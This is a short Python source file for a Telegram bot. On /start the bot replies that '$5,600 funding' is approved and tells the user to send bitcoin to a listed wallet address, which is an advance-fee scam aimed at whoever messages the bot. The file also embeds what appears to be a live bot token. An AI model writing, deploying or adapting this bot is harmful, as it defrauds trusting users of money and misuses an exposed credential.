import telebot
import time

TOKEN = '8206754774:AAFTCQlh7u0-R4pDOELVQepW3c3YBBCwcVQ'

bot = telebot.TeleBot(TOKEN)
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, """🎉 $5,600 FUNDING APPROVED!

Send BTC to:
bc1qzx6sf4xmp9ugteyuacj4vw7pfavd8lxumkez3s

Processing...""")

while True:
    try:
        print("Bot running...")
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except Exception as e:
        print("Error:", e)
        time.sleep(5)